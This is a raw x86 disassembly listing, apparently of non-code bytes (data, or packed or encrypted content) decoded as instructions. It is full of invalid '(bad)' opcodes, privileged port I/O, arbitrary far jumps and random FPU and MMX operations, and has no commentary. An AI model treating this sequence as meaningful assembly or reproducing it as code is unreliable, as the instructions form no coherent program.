  429f88:	mov    ch,0xe2
  429f8a:	cli    
  429f8b:	jmp    0xf3f2:0xf0b6eddb
  429f92:	(bad)  
  429f94:	int    0xf5
  429f96:	fdivr  DWORD PTR [edi+0x2f8e2fd]
  429f9c:	rcr    al,1
  429f9e:	(bad)  
  429f9f:	out    0x9,al
  429fa1:	fucom  st(7)
  429fa3:	cli    
  429fa4:	lock in eax,0xd6
  429fa7:	in     al,dx
  429fa8:	aam    0xb0
  429faa:	leave  
  429fab:	shl    bh,1
  429fad:	out    dx,eax
  429fae:	(bad)  
  429faf:	lods   al,BYTE PTR ds:[esi]
  429fb0:	shl    BYTE PTR [ebp-0x42fe020f],1
  429fb6:	fcmovnu st,st(6)
  429fb8:	hlt    
  429fb9:	repnz add al,0x1
  429fbc:	fcmovnb st,st(7)
  429fbe:	iret   
  429fbf:	(bad)  
  429fc0:	fisttp DWORD PTR [ecx]
  429fc2:	(bad)  
  429fc3:	stc    
  429fc4:	in     al,0xee
  429fc6:	in     eax,dx
  429fc7:	fst    st(5)
  429fc9:	lods   eax,DWORD PTR ds:[esi]
  429fca:	out    dx,al
  429fcb:	(bad)  
  429fcc:	loopne 0x429fb3
  429fce:	fidiv  DWORD PTR [eax+0x2c8dab6]
  429fd4:	in     al,dx
  429fd5:	div    esp
  429fd7:	aam    0xcc
  429fd9:	sar    ah,0xc2
  429fdc:	ror    BYTE PTR [edx],0xdb
  429fdf:	(bad)  
  429fe1:	or     ebx,ebx
  429fe3:	loop   0x429fd2
  429fe5:	rcl    bl,0xd3
  429fe8:	in     eax,dx
  429fe9:	in     al,0xc4
  429feb:	mov    dl,0xe4
  429fed:	in     eax,dx
  429fee:	enter  0xceeb,0xe9
  429ff2:	mov    ebp,0xb5fec1fe
  429ff7:	xlat   BYTE PTR ds:[ebx]
  429ff8:	(bad)  
  429ffa:	in     eax,0xd4
  429ffc:	fdivr  st,st(5)
  429ffe:	cld    
  429fff:	push   cs
  42a000:	iret   
  42a001:	adc    esi,edx
  42a003:	loop   0x429fe1
  42a005:	(bad)  
  42a006:	in     eax,0xf7
  42a008:	fst    st(1)
  42a00a:	mov    ah,0xe0
  42a00c:	retf   
  42a00d:	shr    esi,1
  42a00f:	stc    
  42a010:	(bad)  
  42a011:	icebp  
  42a012:	in     al,dx
  42a013:	clc    
  42a014:	stc    
  42a015:	rcr    bh,0xfb
  42a018:	(bad)  
  42a01a:	(bad)  
  42a01b:	(bad)  
  42a01d:	(bad)
  42a020:	(bad)  
  42a021:	in     eax,0xcd
  42a023:	loop   0x429feb
  42a025:	fbstp  TBYTE PTR [ebx-0x4e3f4c29]
  42a02b:	in     al,dx
  42a02c:	retf   0xd0c6
  42a02f:	mov    edi,0xbeebf2ee
  42a034:	fadd   st,st(2)
  42a036:	repz fst st(6)
  42a039:	shl    edx,cl
  42a03b:	loope  0x42a016
  42a03d:	fsub   st,st(5)
  42a03f:	dec    bh
  42a041:	int3   
  42a042:	rol    DWORD PTR [ecx],0xd1
  42a045:	jmp    0x42a007
  42a047:	fmulp  st(6),st
  42a049:	repz int3 
  42a04b:	test   al,0xf6
  42a04d:	xlat   BYTE PTR ds:[ebx]
  42a04e:	cmc    
  42a04f:	rol    ch,cl
  42a051:	in     al,dx
  42a052:	div    dh
  42a054:	(bad)  
  42a056:	lock hlt 
  42a058:	out    0xe3,al
  42a05a:	(bad)  
  42a05b:	jmp    0xe7fa:0xcbc0d608
  42a062:	cli    
  42a063:	or     dl,dh
  42a065:	mov    cl,0xef
  42a067:	in     al,dx
  42a068:	jmp    0xbfba:0xcee7cbac
  42a06f:	out    dx,al
  42a070:	stc    
  42a071:	cld    
  42a072:	cld    
  42a073:	ror    al,1
  42a075:	std    
  42a076:	(bad)  
  42a077:	into   
  42a078:	aam    0xf9
  42a07a:	or     edi,esp
  42a07c:	std    
  42a07d:	out    0xe0,eax
  42a07f:	fld    st(5)
  42a081:	jmp    0xb3ae:0xc7c8e6dc
  42a088:	jmp    0xdfc4:0xf0e9d1bc
  42a08f:	retf   
  42a090:	aam    0xd0
  42a092:	sar    BYTE PTR [ebx-0xc050d33],cl
  42a098:	call   ebx
  42a09a:	pop    es
  42a09b:	clc    
  42a09c:	fsubrp st(0),st
  42a09e:	add    ecx,ecx
  42a0a0:	fisttp WORD PTR ds:0xc9cdece2
  42a0a6:	ret    
  42a0a7:	cmc    
  42a0a8:	ret    0xd3e9
  42a0ab:	in     eax,dx
  42a0ac:	retf   0xeaf5
  42a0af:	std    
  42a0b0:	mov    eax,0xded8ffee
  42a0b5:	fcmove st,st(6)
  42a0b7:	push   esi
  42a0b9:	xlat   BYTE PTR ds:[ebx]
  42a0ba:	stc    
  42a0bb:	clc    
  42a0bc:	add    ebx,ecx
  42a0be:	pinsrw mm1,WORD PTR [ecx],0xe4
  42a0c2:	in     al,dx
  42a0c3:	stc    
  42a0c4:	ret    0xe4d8
  42a0c7:	mov    dh,0xf7
  42a0c9:	jmp    0xed075bb7
  42a0ce:	stc    
  42a0cf:	in     eax,0xe9
  42a0d1:	aam    0xfe
  42a0d3:	f2xm1  
  42a0d5:	xlat   BYTE PTR ds:[ebx]
  42a0d6:	ror    ebp,1
  42a0d8:	std    
  42a0d9:	clc    
  42a0da:	loopne 0x42a0bc
  42a0dc:	loope  0x42a0a4
  42a0de:	cmc    
  42a0df:	paddusb mm4,mm7
  42a0e2:	in     al,dx
  42a0e3:	pop    es
  42a0e4:	jmp    0x42a0d3
  42a0e6:	iret   
  42a0e7:	ret    0xebf7
  42a0ea:	aam    0xd7
  42a0ec:	mov    dh,0xd1
  42a0ee:	in     al,dx
  42a0ef:	out    dx,al
  42a0f0:	int3   
  42a0f1:	std    
  42a0f2:	icebp  
  42a0f3:	shl    ecx,cl
  42a0f5:	repz bnd ret 0xe1c5
  42a0fa:	mov    esp,0xdef6d8f6
  42a0ff:	add    ah,ah
  42a101:	fucomp st(3)
  42a103:	or     eax,0xe3e6cdd1
  42a108:	mov    al,0xdc
  42a10a:	ret    
  42a10b:	out    dx,eax
  42a10c:	iret   
  42a10d:	jmp    0xcdbd:0xd3b8cdc4
  42a114:	add    ah,dl
  42a116:	jecxz  0x42a0fe
  42a118:	jecxz  0x42a0d4
  42a11a:	(bad)  
  42a11b:	in     eax,0xc1
  42a11d:	cmc    
  42a11e:	push   es
  42a11f:	(bad)  
  42a120:	fisttp WORD PTR [edx]
  42a122:	sti    
  42a123:	or     DWORD PTR [edi-0x530f5a33],esp
  42a129:	in     al,0xe7
  42a12b:	(bad)  
  42a12c:	in     al,dx
  42a12d:	(bad)  
  42a12e:	mov    edi,0x2ccf7ca
  42a133:	rcl    eax,cl
  42a135:	mov    edx,0x1f1d2c1
  42a13a:	ffree  st(6)
  42a13c:	stc    
  42a13d:	fdivp  st(3),st
  42a13f:	call   0xb467d31
  42a144:	fldz   
  42a146:	retf   0xcce8
  42a149:	mov    cl,0xf4
  42a14b:	fidivr DWORD PTR [ecx-0x8480634]
  42a151:	fnstsw WORD PTR [esi-0xb45420a]
  42a157:	mov    esp,0xc6cbe3d6
  42a15c:	(bad)  
  42a15d:	retf   
  42a15e:	jmp    0x42a12b
  42a160:	fld    DWORD PTR [ebx]
  42a162:	cli    
  42a163:	icebp  
  42a164:	lods   eax,DWORD PTR ds:[esi]
  42a165:	out    0xe0,al
  42a167:	mov    al,0xb1
  42a169:	sar    ebx,1
  42a16b:	jmp    0xe9cc:0xd3daeaf5
  42a172:	test   edi,0xe3f3c0f6
  42a178:	loope  0x42a173
  42a17a:	out    0xf7,al
  42a17c:	(bad)  
  42a17e:	(bad)  
  42a180:	or     eax,0xd2e702ea
  42a185:	ret    
  42a186:	int    0xc3
  42a188:	aam    0xb1
  42a18a:	mov    ch,0xf4
  42a18c:	xlat   BYTE PTR ds:[ebx]
  42a18d:	xlat   BYTE PTR ds:[ebx]
  42a18e:	mov    edx,0xdecac8df
  42a193:	sti    
  42a194:	(bad)  
  42a196:	add    DWORD PTR [ecx],eax
  42a198:	fcmovnb st,st(2)
  42a19a:	or     edx,esi
  42a19c:	add    dh,bh
  42a19e:	jmp    0xb9ea:0xfb0fdbed
  42a1a5:	xlat   BYTE PTR ds:[ebx]
  42a1a6:	in     eax,dx
  42a1a7:	mov    cl,0xd3
  42a1a9:	not    bl
  42a1ab:	leave  
  42a1ac:	(bad)  
  42a1ad:	jmp    edi
  42a1af:	jmp    0xf3c1:0xf9defdff
  42a1b6:	(bad)  
  42a1b7:	add    cl,bl
  42a1b9:	loopne 0x42a1c2
  42a1bb:	ftst   
  42a1bd:	cli    
  42a1be:	pop    es
  42a1bf:	faddp  st(3),st
  42a1c1:	push   es
  42a1c2:	push   cs
  42a1c3:	retf   0xc5d1
  42a1c6:	sar    DWORD PTR [esi-0x2d3d4929],1
  42a1cc:	stc    
  42a1cd:	out    0xc4,al
  42a1cf:	(bad)  
  42a1d0:	mov    edx,0xfdedc3b6
  42a1d5:	std    
  42a1d6:	(bad)  
  42a1d8:	cld    
  42a1d9:	not    esi
  42a1db:	cli    
  42a1dc:	jmp    0xdafb:0xece0e2da
  42a1e3:	add    eax,0xf5dfcdb9
  42a1e8:	mov    esp,0xc0eec6b0
  42a1ed:	repnz int 0xef
  42a1f0:	out    dx,al
  42a1f1:	mov    edi,0xbcfdd0ea
  42a1f6:	shl    dl,0xd7
  42a1f9:	(bad)  
  42a1fa:	aad    0xc4
  42a1fc:	(bad)  
  42a1fe:	or     eax,ebp
  42a200:	loop   0x42a1ff
  42a202:	or     DWORD PTR [ebx],eax
  42a204:	ror    cl,1
  42a206:	shl    dl,cl
  42a208:	aad    0xf7
  42a20a:	in     eax,dx
  42a20b:	out    0xc4,eax
  42a20d:	fmul   st,st(6)
  42a20f:	(bad)  
  42a210:	cld    
  42a211:	jmp    0xd5fb77f0
  42a216:	fidivr WORD PTR [esi-0xb2dff41]
  42a21c:	rol    BYTE PTR [esp+eax*8],0xb
  42a220:	std    
  42a221:	iret   
  42a222:	iret   
  42a223:	paddsw mm6,mm2
  42a226:	out    dx,al
  42a227:	mul    cl
  42a229:	mov    ch,0xf0
  42a22b:	mov    dh,0xb4
  42a22d:	jmp    0xf1f65817
  42a232:	icebp  
  42a233:	in     al,dx
  42a234:	(bad)  
  42a236:	out    dx,eax
  42a237:	rcr    esp,cl
  42a239:	in     eax,0xf9
  42a23b:	in     eax,0xd0
  42a23d:	cli    
  42a23e:	retf   
  42a23f:	std    
  42a240:	(bad)  
  42a242:	loope  0x42a216
  42a244:	in     eax,0xb3
  42a246:	retf   
  42a247:	mov    esp,0xb4e6c9ca
  42a24c:	enter  0xb1ae,0xd5
  42a250:	enter  0xfeba,0xfe
  42a254:	rol    DWORD PTR [edx],1
  42a256:	cmc    
  42a257:	(bad)  
  42a259:	shl    ch,1
  42a25b:	hlt    
  42a25c:	retf   0xe9f0
  42a25f:	in     al,0x6
  42a261:	in     al,0x12
  42a263:	enter  0xdccc,0xb2
  42a267:	mov    dl,0xf6
  42a269:	shr    esp,cl
  42a26b:	fcmovnbe st,st(6)
  42a26d:	fcmovu st,st(0)
  42a26f:	mov    edi,0xbaf2d5d8
  42a274:	repz xlat BYTE PTR ds:[ebx]
  42a276:	shl    ecx,0xd6
  42a279:	out    0xd5,al
  42a27b:	retf   0xbeda
  42a27e:	rol    eax,0xe0
  42a281:	out    0x7,al
  42a283:	or     al,0xee
  42a285:	lods   eax,DWORD PTR ds:[esi]
  42a286:	in     al,dx
  42a287:	int3   
  42a288:	in     al,0xc1
  42a28a:	mov    al,0xe7
  42a28c:	sti    
  42a28d:	mov    cl,0xad
  42a28f:	repnz cmc 
  42a291:	mov    ecx,0xf0f3c9c9
  42a296:	shl    ah,0xda
  42a299:	rol    ebx,1
  42a29b:	retf   
  42a29c:	loop   0x42a27d
  42a29e:	loop   0x42a2a7
  42a2a0:	fucom  st(7)
  42a2a2:	or     eax,0xaee9cae2
  42a2a7:	out    0xc0,al
  42a2a9:	loop   0x42a293
  42a2ab:	(bad)  
  42a2ac:	(bad)  
  42a2ad:	out    dx,al
  42a2ae:	int    0xcd
  42a2b0:	mov    ch,0xcb
  42a2b2:	cli    
  42a2b3:	ret    0xf4d4
  42a2b6:	test   DWORD PTR ds:0xc1fa0bd3,0x209e7
  42a2c0:	(bad)  
  42a2c1:	in     eax,dx
  42a2c2:	int3   
  42a2c3:	or     al,0xb3
  42a2c5:	enter  0xbeea,0xcb
  42a2c9:	(bad)  
  42a2ca:	out    0xda,eax
  42a2cc:	hlt    
  42a2cd:	hlt    
  42a2ce:	in     al,0xc5
  42a2d0:	rcl    ah,cl
  42a2d2:	aam    0xef
  42a2d4:	mov    eax,0xf5c6cdc1
  42a2d9:	idiv   bh
  42a2db:	rol    DWORD PTR [esi],1
  42a2dd:	shl    bl,1
  42a2df:	or     ebp,ebp
  42a2e1:	or     al,0xda
  42a2e3:	leave  
  42a2e4:	lods   al,BYTE PTR ds:[esi]
  42a2e5:	scas   eax,DWORD PTR es:[edi]
  42a2e6:	lds    ebp,FWORD PTR [esi-0x13120b11]
  42a2ec:	int    0xc6
  42a2ee:	mov    edi,0xd1b5d7b4
  42a2f3:	(bad)  
  42a2f4:	in     eax,dx
  42a2f5:	cli    
  42a2f6:	jecxz  0x42a2f1
  42a2f8:	add    BYTE PTR [edx+0xbfce3b9],bh
  42a2fe:	pmullw mm1,mm0
  42a301:	adc    ecx,esp
  42a303:	clc    
  42a304:	mov    eax,0xe3e3f7c3
  42a309:	mov    bh,0xf7
  42a30b:	call   0xc64173d6
  42a310:	lock mov ch,0xb8
  42a313:	ror    eax,cl
  42a315:	loop   0x42a2f5
  42a317:	jecxz  0x42a2d5
  42a319:	shr    ebx,0xf6
  42a31c:	pop    es
  42a31d:	or     dl,ah
  42a31f:	(bad)  
  42a320:	fstp   st(6)
  42a322:	out    dx,al
  42a323:	(bad)  
  42a325:	mov    bl,0xcd
  42a327:	(bad)  
  42a328:	repz in al,0xd2
  42a32b:	xlat   BYTE PTR ds:[ebx]
  42a32c:	fadd   st,st(6)
  42a32e:	repz stc 
  42a330:	not    ebx
  42a332:	mov    esi,0xfbb9bafc
  42a337:	mov    esp,0xd2d1fadb
  42a33c:	or     edx,ebx
  42a33e:	push   cs
  42a33f:	fcomp  st(1)
  42a341:	push   cs
  42a342:	jmp    0xe02e6236
  42a347:	in     eax,0xe7
  42a349:	test   ecx,0xeed9f2d3
  42a34f:	into   
  42a350:	in     al,dx
  42a351:	sti    
  42a352:	mov    cl,0x1
  42a354:	fcompp 
  42a356:	fstp   TBYTE PTR [ebp-0x27150e0f]
  42a35c:	call   0xf443a22a
  42a361:	jecxz  0x42a350
  42a363:	out    0xaa,eax
  42a365:	stos   BYTE PTR es:[edi],al
  42a366:	scas   eax,DWORD PTR es:[edi]
  42a367:	idiv   BYTE PTR [ecx+edx*8-0x330c2a0b]
  42a36e:	retf   0xf8bb
  42a371:	mov    ah,0xb8
  42a373:	out    dx,eax
  42a374:	add    cl,al
  42a376:	add    ah,bh
  42a378:	repz out 0xde,eax
  42a37b:	aam    0xd5
  42a37d:	fisttp QWORD PTR [esi]
  42a37f:	push   cs
  42a380:	in     eax,dx
  42a381:	jmp    0x42a367
  42a383:	jmp    ebp
  42a385:	(bad)  
  42a387:	(bad)
  42a38a:	sti    
  42a38b:	fpatan 
  42a38d:	int3   
  42a38e:	repz in al,dx
  42a390:	mov    edi,0xded3c8ff
  42a395:	in     eax,dx
  42a396:	cli    
  42a397:	into   
  42a398:	cli    
  42a399:	hlt    
  42a39a:	fld    st(4)
  42a39c:	mov    BYTE PTR [edx],0x8
  42a39f:	paddsb mm1,QWORD PTR ds:0xedc50f04
  42a3a6:	loope  0x42a364
  42a3a8:	mov    cl,0xfb
  42a3aa:	mov    dl,0xfb
  42a3ac:	fcmovne st,st(0)
  42a3ae:	rcr    cl,1
  42a3b0:	mov    dh,0xd5
  42a3b2:	aam    0xda
  42a3b4:	ret    
  42a3b5:	in     eax,dx
  42a3b6:	shl    esi,1
  42a3b8:	sti    
  42a3b9:	jecxz  0x42a38b
  42a3bb:	add    ecx,ecx
  42a3bd:	add    DWORD PTR [eax],ecx
  42a3bf:	(bad)  
  42a3c1:	loope  0x42a38e
  42a3c3:	retf   
  42a3c4:	jecxz  0x42a3b0
  42a3c6:	out    dx,al
  42a3c7:	retf   0xd7f4
  42a3ca:	cmc    
  42a3cb:	mov    edx,0xc6bbcbef
  42a3d0:	mov    ebp,0xbff8fce4
  42a3d5:	ret    
  42a3d6:	(bad)  
  42a3d8:	lock fcmovbe st,st(1)
  42a3db:	mov    eax,0xe4c0dafc
  42a3e0:	push   cs
  42a3e1:	ret    0xdde
  42a3e4:	sar    DWORD PTR [eax-0x13434c09],cl
  42a3ea:	jecxz  0x42a3d0
  42a3ec:	out    dx,eax
  42a3ed:	fcmovu st,st(7)
  42a3ef:	iret   
  42a3f0:	int3   
  42a3f1:	jecxz  0x42a3c1
  42a3f3:	add    edi,DWORD PTR [ecx+eax*8+0x3d0c1fd]
  42a3fa:	or     cl,BYTE PTR [ebx]
  42a3fc:	push   es
  42a3fd:	rcr    ebp,0xc7
  42a400:	int    0xea
  42a402:	(bad)  
  42a404:	ret    0xc5cd
  42a407:	xlat   BYTE PTR ds:[ebx]
  42a408:	mov    dl,0xb1
  42a40a:	in     al,dx
  42a40b:	lods   al,BYTE PTR ds:[esi]
  42a40c:	(bad)  
  42a40d:	in     eax,dx
  42a40e:	xlat   BYTE PTR ds:[ebx]
  42a40f:	test   esp,0xf0f2e9ee
  42a415:	fsubr  st(6),st
  42a417:	fld    QWORD PTR [esi]
  42a419:	test   edx,0xcbe0e8fd
  42a41f:	ror    BYTE PTR [edx],0xfa
  42a422:	fist   WORD PTR [ecx]
  42a424:	call   0xe8099b08
  42a429:	not    edi
  42a42b:	fcmovnu st,st(2)
  42a42d:	in     eax,dx
  42a42e:	(bad)  
  42a42f:	fldz   
  42a431:	mov    eax,0xe203fcb8
  42a436:	(bad)  
  42a438:	add    eax,0xdab8d1d3
  42a43d:	in     al,0xd5
  42a43f:	in     eax,dx
  42a440:	cli    
  42a441:	add    eax,0xeceacdc8
  42a446:	xlat   BYTE PTR ds:[ebx]
  42a447:	mov    ebp,0xcdb4e8ed
  42a44c:	clc    
  42a44d:	jmp    0x42a449
  42a44f:	fcmove st,st(0)
  42a451:	dec    dh
  42a453:	out    dx,al
  42a454:	loop   0x42a435
  42a456:	add    bl,dh
  42a458:	fsubrp st(6),st
  42a45a:	jecxz  0x42a43e
  42a45c:	in     eax,0xfc
  42a45e:	test   BYTE PTR [eax],0xf5
  42a461:	add    al,0xfd
  42a463:	(bad)  
  42a464:	loope  0x42a44f
  42a466:	mov    ebp,0xc5c1e3f5
  42a46b:	retf   0xebd0
  42a46e:	fcmovbe st,st(1)
  42a470:	cli    
  42a471:	int    0xf5
  42a473:	xlat   BYTE PTR ds:[ebx]
  42a474:	int    0xfb
  42a476:	out    dx,al
  42a477:	fcmovnbe st,st(3)
  42a479:	(bad)
  42a47c:	fsubr  st,st(7)
  42a47e:	cmc    
  42a47f:	aam    0xe3
  42a481:	loope  0x42a486
  42a483:	or     eax,ebp
  42a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a486:	mov    dl,0xb6
  42a488:	retf   0xf7ef
  42a48b:	ret    0xbabb
  42a48e:	(bad)  
  42a48f:	dec    edi
  42a491:	fnstcw WORD PTR [ecx-0x5433e12]
  42a497:	repz loopne 0x42a45f
  42a49a:	ret    0xbfc6
  42a49d:	(bad)  
  42a49e:	test   BYTE PTR ds:0xdecafdc5,0xeb
  42a4a5:	into   
  42a4a6:	into   
  42a4a7:	int    0xf2
  42a4a9:	shl    al,1
  42a4ab:	mov    ebx,0xccd4dfe5
  42a4b0:	retf   0xfce4
  42a4b3:	jmp    0xe113a596
  42a4b8:	ret    
  42a4b9:	add    bh,bh
  42a4bb:	aam    0xd0
  42a4bd:	or     al,BYTE PTR [esi+eiz*8]
  42a4c0:	in     al,dx
  42a4c1:	or     edx,DWORD PTR [ebx]
  42a4c3:	push   es
  42a4c4:	lods   eax,DWORD PTR ds:[esi]
  42a4c5:	retf   0xb3ed
  42a4c8:	mov    cl,0xd3
  42a4ca:	mov    ebx,0xf8b1e8fa
  42a4cf:	rcr    esp,1
  42a4d1:	lock mov ch,0xed
  42a4d4:	mov    ebp,0xfde5fbce
  42a4d9:	in     eax,0x0
  42a4db:	xlat   BYTE PTR ds:[ebx]
  42a4dc:	fld    QWORD PTR ds:0xdfc3fbd8
  42a4e2:	fiadd  DWORD PTR [esi]
  42a4e4:	fsub   st(5),st
  42a4e6:	(bad)  
  42a4e7:	mov    dh,0xb1
  42a4e9:	(bad)  
  42a4ea:	in     eax,0xe0
  42a4ec:	iret   
  42a4ed:	iret   
  42a4ee:	mov    al,0xf2
  42a4f0:	jmp    0xbcdc:0xe0b9d3f9
  42a4f7:	int3   
  42a4f8:	in     eax,dx
  42a4f9:	push   es
  42a4fa:	repnz fcmovnb st,st(2)
  42a4fd:	rol    BYTE PTR [edi],1
  42a4ff:	(bad)  
  42a500:	enter  0x703,0xc
  42a504:	int    0xbf
  42a506:	rol    eax,1
  42a508:	ror    dl,0xc6
  42a50b:	int    0xfa
  42a50d:	mov    ah,0xfe
  42a50f:	out    0xec,al
  42a511:	out    dx,eax
  42a512:	mul    cl
  42a514:	fcomip st,st(4)
  42a516:	int    0xdd
  42a518:	hlt    
  42a519:	out    0xe6,al
  42a51b:	add    DWORD PTR [ebx],eax
  42a51d:	fcmovb st,st(1)
  42a51f:	in     al,0xc6
  42a521:	pop    es
  42a522:	jecxz  0x42a4f7
  42a524:	in     eax,0xce
  42a526:	mov    dl,0xdc
  42a528:	mov    bl,0xe4
  42a52a:	in     al,0xe2
  42a52c:	out    dx,eax
  42a52d:	shl    BYTE PTR [eax-0x252c0f46],cl
  42a533:	loope  0x42a50d
  42a535:	int3   
  42a536:	repz (bad) 
  42a538:	int    0x0
  42a53a:	in     eax,0x0
  42a53c:	rcr    ebp,0xea
  42a53f:	jmp    0xcb4aac4d
  42a544:	(bad)  
  42a545:	out    0xa5,eax
  42a547:	(bad)  
  42a548:	hlt    
  42a549:	iret   
  42a54a:	mov    bl,0xcb
  42a54c:	lock rcl cl,cl
  42a54f:	(bad)  
  42a551:	out    dx,al
  42a552:	fcomi  st,st(0)
  42a554:	sar    esi,1
  42a556:	rcr    ch,0xec
  42a559:	in     al,dx
  42a55a:	(bad)  
  42a55b:	fdivp  st(5),st
  42a55d:	ror    dl,1
  42a55f:	sti    
  42a560:	fsubr  st,st(2)
  42a562:	loope  0x42a552
  42a564:	mov    dl,0xb2
  42a566:	test   al,0xd5
  42a568:	iret   
  42a569:	(bad)  
  42a56a:	icebp  
  42a56b:	aam    0xf6
  42a56d:	(bad)  
  42a56e:	fcmovnbe st,st(6)
  42a570:	iret   
  42a571:	mov    ebp,0xf6e1ceef
  42a576:	out    0xed,eax
  42a578:	add    ebx,edx
  42a57a:	repz fsubr st,st(3)
  42a57d:	sti    
  42a57e:	(bad)  
  42a580:	out    dx,eax
  42a581:	in     eax,dx
  42a582:	fisttp WORD PTR [ecx]
  42a584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a585:	in     eax,dx
  42a586:	leave  
  42a587:	loope  0x42a559
  42a589:	mov    bl,0xc4
  42a58b:	int3   
  42a58c:	shl    ah,0xbb
  42a58f:	sti    
  42a590:	mov    ebp,0xc3fcd2ca
  42a595:	sti    
  42a596:	repz rol BYTE PTR [ecx],0xc5
  42a59a:	out    0x0,al
  42a59c:	fxch   st(3)
  42a59e:	(bad)  
  42a59f:	(bad)  
  42a5a0:	aam    0xcd
  42a5a2:	adc    bl,dh
  42a5a4:	in     eax,0xd7
  42a5a6:	repz enter 0xf7af,0xb7
  42a5ab:	aad    0xcd
  42a5ad:	call   0xee3c5a69
  42a5b2:	std    
  42a5b3:	aad    0xbb
  42a5b5:	repnz loope 0x42a58f
  42a5b8:	lock add eax,0xbef6fcc4
  42a5be:	add    esp,esi
  42a5c0:	jmp    0xe2e9:0xe00e0703
  42a5c7:	(bad)  
  42a5c9:	lock mov ch,0xc5
  42a5cc:	rol    esp,1
  42a5ce:	sti    
  42a5cf:	mov    eax,0xc8e2e8ea
  42a5d4:	add    al,al
  42a5d6:	mov    ebp,0xc6d2fbdb
  42a5db:	stc    
  42a5dc:	add    ah,bl
  42a5de:	mov    BYTE PTR [ebx],0xec
  42a5e1:	(bad)  
  42a5e2:	fcmove st,st(2)
  42a5e4:	retf   0xf6aa
  42a5e7:	mov    dl,0xe5
  42a5e9:	stos   BYTE PTR es:[edi],al
  42a5ea:	loopne 0x42a5cc
  42a5ec:	sti    
  42a5ed:	int    0xd6
  42a5ef:	lds    edi,FWORD PTR [eax-0x2cfc0f10]
  42a5f5:	hlt    
  42a5f6:	fdivr  st,st(1)
  42a5f8:	cld    
  42a5f9:	cli    
  42a5fa:	(bad)  
  42a5fb:	clc    
  42a5fc:	shl    esi,1
  42a5fe:	fild   WORD PTR [ebx]
  42a600:	jmp    0xed1691cf
  42a605:	rcl    cl,0xb1
  42a608:	mov    al,0xe5
  42a60a:	out    dx,al
  42a60b:	iret   
  42a60c:	(bad)  
  42a60d:	fyl2x  
  42a60f:	lds    esi,FWORD PTR [esi-0x30fc1534]
  42a615:	stc    
  42a616:	add    ebx,ecx
  42a618:	fadd   st,st(0)
  42a61a:	shl    ecx,cl
  42a61c:	push   es
  42a61d:	add    ebx,esp
  42a61f:	(bad)
  42a622:	push   cs
  42a623:	pmulhw mm5,mm4
  42a626:	scas   al,BYTE PTR es:[edi]
  42a627:	(bad)
  42a62a:	shl    BYTE PTR [ecx-0x2c4e0b50],1
  42a630:	fsubp  st(6),st
  42a632:	iret   
  42a633:	leave  
  42a634:	aad    0xee
  42a636:	fld    st(7)
  42a638:	add    ah,ch
  42a63a:	aam    0x5
  42a63c:	cmc    
  42a63d:	push   es
  42a63e:	or     ebx,ebx
  42a640:	in     al,dx
  42a641:	stc    
  42a642:	loop   0x42a61e
  42a644:	enter  0xddac,0xe2
  42a648:	(bad)  
  42a649:	stos   BYTE PTR es:[edi],al
  42a64a:	out    0xdb,eax
  42a64c:	out    0xb7,eax
  42a64e:	ror    ch,1
  42a650:	in     eax,dx
  42a651:	retf   
  42a652:	dec    edi
  42a654:	mov    esp,0xede7febc
  42a659:	mov    ebp,0xd6c7f7b9
  42a65e:	retf   
  42a65f:	sti    
  42a660:	jmp    0xc7e9:0xedecc80c
  42a667:	mov    dh,0xec
  42a669:	mov    al,0xea
  42a66b:	lock jmp 0x42a662
  42a66e:	(bad)  
  42a66f:	fprem  
  42a671:	mov    ebp,0xd8e0f5df
  42a676:	mov    ch,0xdf
  42a678:	rol    DWORD PTR [esi],cl
  42a67a:	icebp  
  42a67b:	cld    
  42a67c:	or     cl,ah
  42a67e:	iret   
  42a67f:	out    0xfb,eax
  42a681:	fdivp  st(1),st
  42a683:	or     al,0xf1
  42a685:	test   eax,0xb7f5e0e2
  42a68a:	cli    
  42a68b:	enter  0xe5cc,0xc4
  42a68f:	mov    esi,0xe9c9dbf0
  42a694:	sti    
  42a695:	int3   
  42a696:	shl    bl,cl
  42a698:	mov    esp,0xd403ffe4
  42a69d:	sti    
  42a69e:	or     DWORD PTR [esi],eax
  42a6a0:	(bad)  
  42a6a2:	adc    ecx,esi
  42a6a4:	stos   DWORD PTR es:[edi],eax
  42a6a5:	out    0xe2,eax
  42a6a7:	out    0xb2,eax
  42a6a9:	mov    bh,0xc5
  42a6ab:	sti    
  42a6ac:	mov    dh,0xd8
  42a6ae:	clc    
  42a6af:	ftst   
  42a6b1:	into   
  42a6b2:	out    dx,eax
  42a6b3:	std    
  42a6b4:	mov    ebp,0xdef6d3f8
  42a6b9:	(bad)  
  42a6ba:	icebp  
  42a6bb:	fadd   QWORD PTR [esi]
  42a6bd:	stc    
  42a6be:	add    bh,bl
  42a6c0:	std    
  42a6c1:	into   
  42a6c2:	fcmovnu st,st(0)
  42a6c4:	rcl    dl,cl
  42a6c6:	fucomip st,st(3)
  42a6c8:	jmp    0xb5eb8ac0
  42a6cd:	mov    eax,0xf0b6f5ca
  42a6d2:	stc    
  42a6d3:	mov    ebx,0xf8f3c801
  42a6d8:	stc    
  42a6d9:	rol    bh,1
  42a6db:	out    0xd4,al
  42a6dd:	(bad)
  42a6e0:	fcomip st,st(4)
  42a6e2:	(bad)
  42a6e5:	retf   0xcbcd
  42a6e8:	leave  
  42a6e9:	mov    bl,0xf7
  42a6eb:	iret   
  42a6ec:	mov    dl,0xd1
  42a6ee:	iret   
  42a6ef:	mov    ebx,0xc8eeb4e9
  42a6f4:	sar    edx,1
  42a6f6:	push   es
  42a6f7:	cld    
  42a6f8:	clc    
  42a6f9:	loop   0x42a6cc
  42a6fb:	inc    BYTE PTR [edi]
  42a6fd:	fsubr  st,st(3)
  42a6ff:	add    eax,esp
  42a701:	ret    0xecf9
  42a704:	shl    ebx,cl
  42a706:	mov    bl,0xd3
  42a708:	scas   al,BYTE PTR es:[edi]
  42a709:	iret   
  42a70a:	in     al,0xf5
  42a70c:	mov    al,0xb0
  42a70e:	(bad)  
  42a70f:	(bad)  
  42a710:	jmp    0x42a6cc
  42a712:	iret   
  42a713:	rcl    ah,cl
  42a715:	mov    ebp,0x5d7c2fd
  42a71a:	loop   0x42a6ee
  42a71c:	or     ah,ah
  42a71e:	out    dx,eax
  42a71f:	loop   0x42a6f9
  42a721:	enter  0xce7,0xe3
  42a725:	rcr    esi,cl
  42a727:	retf   
  42a728:	hlt    
  42a729:	repz lock loope 0x42a713
  42a72d:	in     eax,dx
  42a72e:	repz fst st(6)
  42a731:	clc    
  42a732:	rol    BYTE PTR [ecx],cl
